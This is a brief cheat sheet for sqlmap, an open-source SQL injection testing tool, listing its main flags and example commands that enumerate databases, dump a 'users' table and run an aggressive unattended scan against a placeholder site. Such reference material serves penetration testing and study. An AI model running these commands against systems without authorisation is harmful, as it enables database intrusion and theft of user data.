# sqlmap

## What it is
An open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over database servers.

---

## Key Flags
| Flag | Description |
|------|-------------|
| `-u` | Target URL |
| `-r` | Load HTTP request from a file |
| `-p` | Testable parameter(s) |
| `--dbs` | Enumerate DBMS databases |
| `--tables` | Enumerate DBMS database tables |
| `--dump` | Dump DBMS database table entries |
| `--batch` | Never ask for user input, use the default behavior |
| `--level` | Level of tests to perform (1-5) |
| `--risk` | Risk of tests to perform (1-3) |

---

## Examples

**Basic URL test**
```bash
sqlmap -u "http://example.com/page.php?id=1"
```

**Enumerate databases**
```bash
sqlmap -u "http://example.com/page.php?id=1" --dbs
```

**Dump a specific table**
```bash
sqlmap -u "http://example.com/page.php?id=1" -D target_db -T users --dump
```

**Run from an intercepted request file**
```bash
sqlmap -r request.txt -p "username"
```

**High intensity test (aggressive)**
```bash
sqlmap -u "http://example.com/page.php?id=1" --level=5 --risk=3 --batch
```
